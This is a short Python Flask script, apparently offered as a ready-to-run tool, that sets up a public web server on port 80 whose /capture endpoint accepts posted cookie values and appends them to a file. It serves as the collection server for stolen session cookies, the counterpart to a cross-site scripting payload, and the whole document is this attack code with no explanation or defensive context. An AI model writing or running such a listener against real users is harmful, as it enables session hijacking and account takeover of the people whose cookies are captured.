Web-Server Basic Python

```
#!/usr/bin/env python3

from flask import Flask, request, make_response

app = Flask(__name__)

@app.route('/capture', methods=['POST'])
def capture():
    cookie = request.form.get('cookie')
    with open('captured_cookies.txt', 'a') as f:
        f.write(cookie + '\n')
    return ''

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
```
